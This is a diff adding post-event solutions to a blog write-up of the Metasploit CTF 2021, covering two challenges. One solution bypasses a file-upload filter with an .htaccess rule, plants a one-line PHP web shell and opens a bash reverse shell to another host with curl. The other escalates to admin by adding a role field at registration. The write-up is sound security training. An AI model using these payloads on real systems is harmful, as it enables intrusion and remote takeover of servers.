@@ -267,10 +267,83 @@ We can then use this cookies to load the private page and get the flag.
 
 `https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/`
 
+## Post CTF Solutions
+
+Solutions to challenges I figured out after the CTF ended.
+
+### 9 of Spades
+
+This challenge was on port 20055. The objective was to bypass the filter in place for uploading a file we can
+execute php code.
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-33.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+We can upload .htaccess file that specifies any extension of our choosing to execute php code.
+
+In the below screenshot I intercept the upload request using burp and modify the request. The .htaccess file has the
+below content that enables a file with .mike extension to be executed as a php file.
+
+```sh
+AddType application/x-httpd-php .mike
+```
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-34.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+Now I uploaded a file with the following php code that executes system commands.
+
+```php
+<?php echo system($_REQUEST['cmd']);?>
+```
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-35.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+Using this curl command we get a reverse shell.
+
+```sh
+curl -G --data-urlencode "cmd=/bin/bash -c '/bin/bash -i >& /dev/tcp/172.17.6.180/53 0>&1 &'" http://172.17.6.181:20055/file_uploads/execute.mike
+```
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-36.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+With the shell we can copy the flag to the uploads location to download it from the browser.
+
+**Flag:**
+
+{{< image src="/img/metasploitctf2021/9ofspades.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+### 4 of Diamonds
+
+This challenge was on port 10010. When we load it on the browser we get the following app.
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-37.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+After creating an account the account information is stored in the response in a script tag.
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-38.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+All these parameters are those provided during registration. We can try to manipulate the role from user to admin.
+
+During registration I intercepted the request with burp and added role as admin.
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-39.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+We then get access to the admin panel that has the flag.
+
+{{< image src="/img/metasploitctf2021/metasploit-ctf-40.png" alt="" position="center" style="border-radius: 8px;" >}}
+
+**Flag:**
+
+{{< image src="/img/metasploitctf2021/4ofdiamonds.png" alt="" position="center" style="border-radius: 8px;" >}}
+
 ## Conclusion
 
 Some great new challenges this year and definitely more challenging. Looking forward to next year's CTF. 
 
 The last challenge definitely made me feel like I need to get back to Web Security Academy.
 
-If you have any questions or feedback feel free to reach out
+If you have any questions or feedback feel free to reach out.
+
+Another writeup you can read:
+
+https://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review
+
